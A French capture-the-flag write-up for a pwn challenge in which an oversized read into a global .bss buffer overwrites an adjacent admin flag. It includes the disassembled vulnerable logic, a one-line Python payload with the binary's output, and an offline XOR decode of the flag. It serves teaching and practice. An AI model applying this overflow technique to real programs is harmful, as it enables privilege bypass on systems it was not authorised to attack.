# NCTF — « bss overflow flip admin » (pwn, ELF ET_EXEC)

**Flag :** `NCTF{bss_overflow_flipped_is_admin}` (résolu par Djo, 06/11/2026 ; source WhatsApp).

## Challenge
ELF 64-bit, **non strippé**, **ET_EXEC** (pas de PIE → adresses fixes). `strings` : « register your
name: », « welcome, admin. », « standard users only. ». Pas de `NCTF{` en clair → flag chiffré en `.rodata`.

## Vuln (objdump -d -M intel)
```
user        = 0x404060     ; buffer global en .bss, taille 0x48 = 72 octets
[user+0x40] = 0            ; drapeau "admin" à l'offset 64, init 0
read(0, user, 0x80)        ; lit jusqu'à 128 octets  → OVERFLOW (72 < 128)
test [user+0x40] != 0      ; si non-nul → "welcome, admin." + reveal()
                           ; sinon      → "standard users only."
```
`reveal()` : pour i de 0..0x22 (35 o) : `out[i] = enc[i] ^ 0x3c` ; write(1,out,35).

## Exploit — pas besoin de contrôler RIP
Le drapeau admin est une **globale adjacente** dans le même buffer `.bss`, à l'offset 64, DANS la zone
lue par `read`. Écrire **65 octets** (64 de padding + 1 octet non-nul sur le drapeau) le met à ≠ 0 :
```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*72)" | ./chall
# register your name:
# welcome, admin.
# NCTF{bss_overflow_flipped_is_admin}
```
Frontière : 65 o → succès ; 64 o → « standard users only. ».

## Décodage offline (sans exécuter — enc à `.rodata 0x402040`, `objdump -s -j .rodata`)
```python
enc = bytes.fromhex('727f687a475e4f4f63534a594e5a50534b635a50554c4c595863554f635d5851555241')
print(bytes(b ^ 0x3c for b in enc).decode())   # NCTF{bss_overflow_flipped_is_admin}
```

## Leçon
Overflow par `read` trop large dans un buffer **global (.bss/.data)** → on n'écrase pas une adresse de
retour mais une **variable d'état adjacente** (drapeau admin/is_auth). Chercher ce pattern quand le
buffer est global et qu'un drapeau de privilège vit juste après. Pattern : [[bss-global-flag-overflow]].
